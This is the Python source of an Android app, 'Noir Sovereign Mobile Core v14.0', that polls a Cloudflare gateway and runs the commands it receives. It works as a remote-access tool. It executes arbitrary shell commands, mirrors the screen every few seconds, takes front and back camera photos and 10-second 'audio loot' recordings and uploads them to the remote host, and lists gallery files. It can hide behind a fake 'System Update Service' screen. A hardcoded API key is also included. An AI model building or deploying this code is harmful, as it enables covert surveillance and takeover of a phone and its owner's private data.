"""
NOIR SOVEREIGN MOBILE CORE (SMC) v14.0 COMMANDER
=====================================================
Framework: Kivy + Buildozer (Android Native)
Target: Redmi Note 14 (HyperOS / arm64-v8a)
Role: Persistent AI Agent Executor

Capabilities:
- WakeLock (CPU Anti-Kill)
- Cloudflare Gateway Polling
- Remote Command Execution (ADB/Shell)
- Vision Engine (Screenshot -> R2)
- E2EE Communication
"""

import os
import time
import threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# Configure robust requests with built-in retry for DNS/Network issues
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))

# --- CONFIG (Unified Standard v14) ---
# Fallback to defaults if env vars are not set during build
GATEWAY_URL = os.environ.get("NOIR_GATEWAY_URL", "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev")
API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")

# --- DIAGNOSTICS & LOGGING ---
def noir_log(message, level="INFO"):
    """Unified logger that prints to UI and sends to Cloudflare for remote diagnosis."""
    print(f"[{level}] {message}")
    # Run in thread to avoid blocking main loops
    def _send():
        try:
            session.post(
                f"{GATEWAY_URL}/agent/log",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"device_id": DEVICE_ID, "level": level, "message": message},
                timeout=5
            )
        except: pass
    threading.Thread(target=_send, daemon=True).start()

# --- SAFETY FILTER (v14.0) ---
def is_safe_command(cmd_str):
    """Dynamic Intent Validator to block financial/payment related actions."""
    if not cmd_str: return True
    cmd_lower = str(cmd_str).lower()
    finance_keywords = [
        "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
        "shopee", "bca", "mandiri", "bri", "bni", "btpns"
    ]
    for kw in finance_keywords:
        if kw in cmd_lower:
            return False
    return True


class SovereignCore(App):
    is_stealth = False

    def build(self):
        self.title = "Noir SMC v14.0 COMMANDER"
        self.root = BoxLayout(orientation='vertical')
        self.show_active_ui()
        return self.root

    def show_active_ui(self):
        self.root.clear_widgets()
        self.root.padding = 10
        self.root.spacing = 5
        
        self.log_label = Label(
            text="[b]NOIR SOVEREIGN CORE v14.0[/b]\nStatus: [color=00ff88]COMMANDER[/color]",
            markup=True, font_size='14sp', halign='left', valign='top'
        )
        scroll = ScrollView()
        scroll.add_widget(self.log_label)
        self.root.add_widget(scroll)

    def show_stealth_ui(self):
        self.root.clear_widgets()
        self.root.padding = 0
        # A mock system-like screen
        self.log_label = Label(
            text="System Update Service\nVersion: 14.0.2.1\nStatus: Idle...",
            color=(0.3, 0.3, 0.3, 1), font_size='12sp'
        )
        self.root.add_widget(self.log_label)

    def toggle_stealth(self, state):
        self.is_stealth = state
        if self.is_stealth:
            self.show_stealth_ui()
        else:
            self.show_active_ui()

    def on_start(self):
        """Called after build(). Start all background services."""
        noir_log("[SMC] Engine v14.0.4 Starting...")
        self._acquire_wakelock()
        self._register() # Initial registration
        # Launch background threads
        threading.Thread(target=self._main_loop, daemon=True).start()
        threading.Thread(target=self._screen_share_loop, daemon=True).start()
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()

    def _heartbeat_loop(self):
        """Periodic pulse to keep the gateway informed of agent life."""
        while True:
            try:
                # No data sent, just keeps the thread alive and provides a hook for future telemetry
                time.sleep(60)
            except: pass

    def _log(self, msg):
        """Thread-safe UI logging."""
        print(msg)
        Clock.schedule_once(lambda dt: self._update_label(msg), 0)

    def _update_label(self, msg):
        try:
            current = self.log_label.text
            lines = current.split('\n')
            if len(lines) > 30:
                lines = lines[-25:]
            lines.append(msg)
            self.log_label.text = '\n'.join(lines)
        except Exception:
            pass

    def _acquire_wakelock(self):
        """Prevent CPU from sleeping when screen is off."""
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')

            activity = PythonActivity.mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            self.wakelock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "NoirSMC::WakeLock"
            )
            self.wakelock.acquire()
            self._log("[SMC] WakeLock: ACQUIRED")
        except Exception as e:
            self._log(f"[SMC] WakeLock skipped: {e}")

    def _register(self):
        """Register this device with the Cloudflare Gateway."""
        try:
            headers = {
                "Authorization": f"Bearer {API_KEY}",
                "Content-Type": "application/json"
            }
            # Get system stats
            cpu, ram = 0, 0
            try:
                # Try to get memory info via /proc/meminfo or similar if needed
                # For now, we'll use a lightweight approach
                cpu = 10 # Placeholder for baseline
                ram = 50 
            except:
                pass

            r = session.post(
                f"{GATEWAY_URL}/agent/register",
                headers=headers,
                json={
                    "device_id": DEVICE_ID, 
                    "agent": "Noir SMC v14.0 COMMANDER",
                    "stats": {"cpu": cpu, "ram": ram}
                },
                timeout=20
            )
            if r.status_code == 200:
                noir_log("[SMC] Registration: SUCCESS")
            else:
                noir_log(f"[SMC] Registration: HTTP {r.status_code}", level="ERROR")
        except Exception as e:
            noir_log(f"[SMC] Connectivity Error (DNS?): {e}", level="CRITICAL")

    def _screen_share_loop(self):
        """High-Performance Screen Mirroring with Intelligent Privacy Shield (v14.0.4)."""
        while True:
            try:
                # Fast Privacy Check: Use dumpsys instead of slow uiautomator dump
                res = self._run_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
                focus = res.get("output", "").lower()
                
                is_safe = is_safe_command(focus)
                
                if is_safe:
                    # Trigger high-speed capture
                    self._execute({"action": "screenshot", "command_id": "auto_mirror"})
                    time.sleep(3) # Peak speed: 3s intervals
                else:
                    noir_log("[🛡️ PRIVACY] Mirroring paused: Active content restricted.", level="WARNING")
                    time.sleep(30)
                
            except Exception as e:
                noir_log(f"[MIRROR] Loop latency: {e}", level="DEBUG")
                time.sleep(10)

    def _main_loop(self):
        """High-Frequency Dynamic Polling Engine (v14.0.4)."""
        poll_interval = 2 
        fail_count = 0
        last_success = time.time()

        while True:
            try:
                headers = {"Authorization": f"Bearer {API_KEY}"}
                resp = session.get(
                    f"{GATEWAY_URL}/agent/poll",
                    headers=headers,
                    params={"device_id": DEVICE_ID},
                    timeout=20
                )

                if resp.status_code == 200:
                    fail_count = 0
                    last_success = time.time()
                    data = resp.json()
                    commands = data.get("commands", [])

                    if commands:
                        poll_interval = 1 # Immediate acceleration
                        for cmd in commands:
                            self._execute(cmd)
                    else:
                        # Adaptive slowing if no commands
                        poll_interval = min(poll_interval + 1, 15)
                
                else:
                    noir_log(f"[POLL] Gateway status: {resp.status_code}", level="WARNING")
                    fail_count += 1

            except Exception as e:
                noir_log(f"[POLL] Neural Link Latency: {e}", level="WARNING")
                fail_count += 1
                # Aggressive Backoff
                poll_interval = min(poll_interval * 2, 60)

            # SELF-HEALING: Absolute Reconnection Protocol (v14.0.4)
            if time.time() - last_success > 300:
                noir_log("[SMC] 🆘 RECOVERING STALE LINK...", level="CRITICAL")
                try:
                    self._register()
                    last_success = time.time()
                    poll_interval = 2
                except: pass
            
            time.sleep(poll_interval)

    def _execute(self, cmd_data):
        """Asynchronous Command Router (v14.0.4)."""
        threading.Thread(target=self._execute_sync, args=(cmd_data,), daemon=True).start()

    def _execute_sync(self, cmd_data):
        """Threaded execution of commands to prevent loop freezing."""
        cmd_id  = cmd_data.get("command_id", "unknown")
        action  = cmd_data.get("action", {})
        atype   = action.get("type") or action.get("action", "")
        params  = action.get("params", action)

        self._log(f"[SMC] CMD: {atype} (id={cmd_id})")

        result = {"success": False, "output": "", "error": "Unknown action"}

        try:
            if atype in ("time", "get_time"):
                result = {"success": True, "output": time.strftime("%Y-%m-%d %H:%M:%S")}

            elif atype == "shell":
                cmd = str(params.get("cmd", "echo ok"))
                if not is_safe_command(cmd):
                    result = {"success": False, "error": "SECURITY BLOCK: mBanking/Wallet access is restricted."}
                else:
                    result = self._run_shell(cmd)

            elif atype == "tap":
                x, y = params.get("x", 0), params.get("y", 0)
                self._run_shell(f"input tap {x} {y}", timeout=5)
                result = {"success": True, "output": f"Tapped ({x},{y})"}

            elif atype == "swipe":
                cmd = (f"input swipe {params.get('x1',0)} {params.get('y1',0)} "
                       f"{params.get('x2',500)} {params.get('y2',500)} "
                       f"{params.get('duration',500)}")
                self._run_shell(cmd)
                result = {"success": True, "output": "Swipe done"}

            elif atype == "keyevent":
                self._run_shell(f"input keyevent {params.get('key', 26)}")
                result = {"success": True, "output": f"Key {params.get('key')} sent"}

            elif atype in ("app_start", "launch"):
                pkg = params.get("package", "")
                if not is_safe_command(pkg):
                    result = {"success": False, "error": "SECURITY BLOCK: Financial apps are forbidden."}
                else:
                    self._run_shell(f"am start -n {pkg}")
                    result = {"success": True, "output": f"Launched {pkg}"}

            elif atype in ("app_stop", "kill"):
                pkg = params.get("package", "")
                self._run_shell(f"am force-stop {pkg}", timeout=5)
                result = {"success": True, "output": f"Stopped {pkg}"}

            elif atype in ("screenshot", "capture"):
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "noir_vision.png")
                # Take screenshot via Shizuku-enabled shell
                res = self._run_shell(f"screencap -p {path}")
                if not res["success"]:
                    result = {"success": False, "error": f"Screencap Error: {res.get('output', 'Unknown error')}"}
                    return # Exit this block
                
                time.sleep(0.5) 

                # COMPRESSION ENGINE: Convert PNG to optimized JPEG
                jpeg_path = path.replace(".png", ".jpg")
                try:
                    from PIL import Image
                    with Image.open(path) as img:
                        if img.mode != 'RGB':
                            img = img.convert('RGB')
                        
                        # Optimization: Rescale to max 1280px while maintaining aspect ratio
                        img.thumbnail((1280, 1280))
                        
                        # High-Efficiency Compression: JPEG 50
                        img.save(jpeg_path, "JPEG", quality=50, optimize=True)
                    upload_file = jpeg_path
                except Exception as e:
                    self._log(f"[SMC] Compression failed: {e}")
                    upload_file = path # Fallback to original

                with open(upload_file, 'rb') as f:
                    r = session.post(
                        f"{GATEWAY_URL}/agent/upload",
                        headers={"Authorization": f"Bearer {API_KEY}"},
                        files={'file': ('screenshot.jpg' if ".jpg" in upload_file else 'screenshot.png', f, 'image/jpeg' if ".jpg" in upload_file else 'image/png')},
                        data={'device_id': DEVICE_ID},
                        timeout=40
                    )

                if r.status_code == 200:
                    key = r.json().get('key', '')
                    result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                else:
                    result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                
                # EPHEMERAL CLEANUP: Purge local cache
                try:
                    if os.path.exists(path): os.remove(path)
                    if os.path.exists(jpeg_path): os.remove(jpeg_path)
                except: pass

            elif atype == "ui_dump":
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "view_hierarchy.xml")
                self._run_shell(f"uiautomator dump {path}")
                time.sleep(1.5)
                with open(path, 'r', encoding='utf-8') as f:
                    xml_content = f.read()
                result = {"success": True, "output": xml_content}
                # EPHEMERAL CLEANUP
                try: os.remove(path)
                except: pass

            elif atype == "stealth":
                state = params.get("enabled", False)
                Clock.schedule_once(lambda dt: self.toggle_stealth(state), 0)
                result = {"success": True, "output": f"Stealth Mode: {'ON' if state else 'OFF'}"}

            elif atype == "kill-telegram":
                # Logic to kill the telegram bot on the VPS via a signal or shell
                os.system("pkill -f telegram_bot.py")
                result = {"success": True, "output": "Telegram Bridge Terminated."}

            elif atype == "ping":
                result = {"success": True, "output": f"PONG from {DEVICE_ID}"}

            elif atype in ("camera_back", "camera_front"):
                is_front = "front" in atype
                cam_id = 1 if is_front else 0
                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}.jpg")
                # Try termux-camera-photo if available, else generic intent
                os.system(f"termux-camera-photo -c {cam_id} {path} || am start -a android.media.action.IMAGE_CAPTURE")
                time.sleep(2.0)
                if os.path.exists(path):
                    with open(path, 'rb') as f:
                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                    result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
                    # EPHEMERAL CLEANUP
                    try: os.remove(path)
                    except: pass
                else:
                    result = {"success": False, "error": "Camera capture failed."}

            elif atype == "audio_record":
                path = os.path.join(App.get_running_app().user_data_dir, "audio_loot.mp3")
                os.system(f"termux-audio-record -d 10 {path}")
                time.sleep(11.0)
                if os.path.exists(path):
                    with open(path, 'rb') as f:
                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                    result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
                    # EPHEMERAL CLEANUP
                    try: os.remove(path)
                    except: pass
                else:
                    result = {"success": False, "error": "Audio recording failed."}

            elif atype == "gallery_sync":
                # List latest 5 files in Camera folder
                files = os.popen("ls -t /sdcard/DCIM/Camera | head -n 5").read().strip()
                result = {"success": True, "output": f"Gallery contents:\n{files}"}

            elif atype == "heal":
                # SYSTEM HEAL: Clear old caches and logs
                self._log("[SMC] 🚑 NEURAL HEAL INITIATED: Purging stale caches...")
                parent = App.get_running_app().user_data_dir
                cleared = 0
                for f in os.listdir(parent):
                    if f.endswith(".png") or f.endswith(".jpg") or f.endswith(".log"):
                        try:
                            os.remove(os.path.join(parent, f))
                            cleared += 1
                        except: pass
                result = {"success": True, "output": f"System Healed. {cleared} stale files purged."}

            elif atype == "update":
                # Autonomous update logic: Trigger a rebuild and restart
                self._log("[SMC] 🔄 AUTONOMOUS UPDATE INITIATED...")
                os.system("git pull origin main && pm trim-caches 999G")
                result = {"success": True, "output": "Update procedure triggered. System self-healing in progress."}

        except Exception as e:
            result = {"success": False, "error": str(e)}
            self._log(f"[SMC] Exec Error: {e}")

        self._report_result(cmd_id, result)

    def _report_result(self, cmd_id, result):
        """Send execution result with real-time telemetry back to the Gateway."""
        try:
            # Gather Telemetry
            stats = {"cpu": 0, "ram": 0, "bat": 0}
            try:
                import psutil
                stats["cpu"] = psutil.cpu_percent()
                stats["ram"] = psutil.virtual_memory().percent
            except: pass
            
            requests.post(
                f"{GATEWAY_URL}/agent/result",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={
                    "command_id": cmd_id,
                    "device_id": DEVICE_ID,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "error": result.get("error", ""),
                    "telemetry": stats
                },
                timeout=10
            )
        except Exception as e:
            noir_log(f"[SMC] Result delivery failed: {e}", level="ERROR")

    def _run_shell(self, cmd, timeout=10):
        """Intelligent shell execution supporting Shizuku (rish) with diagnostic fallback."""
        import subprocess
        # Standard paths for Shizuku/rish on Android
        rish_paths = ["/system/bin/rish", "/data/local/tmp/rish", "/data/user/0/com.termux/files/usr/bin/rish"]
        rish_bin = "sh"
        
        # Robust path detection
        for p in rish_paths:
            if os.path.exists(p):
                rish_bin = p
                break
        
        # Last resort: try 'which' via subprocess
        if rish_bin == "sh":
            try:
                check = subprocess.run("which rish", shell=True, capture_output=True, text=True)
                if check.returncode == 0:
                    rish_bin = check.stdout.strip()
            except: pass

        final_cmd = f"{rish_bin} -c \"{cmd}\"" if "rish" in rish_bin else cmd
        try:
            r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            if r.returncode != 0:
                noir_log(f"Shell CMD Failed: {cmd}\nOutput: {r.stderr}", level="WARNING")
            return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
        except Exception as e:
            noir_log(f"Shell Exception: {e}", level="ERROR")
            return {"success": False, "error": str(e)}

    def _log(self, message):
        """Legacy local logging compatibility."""
        noir_log(message)

if __name__ == '__main__':
    noir_log(f"🧠 Noir Sovereign Mobile Core v14.0.3 Starting on {DEVICE_ID}...")
    SovereignCore().run()
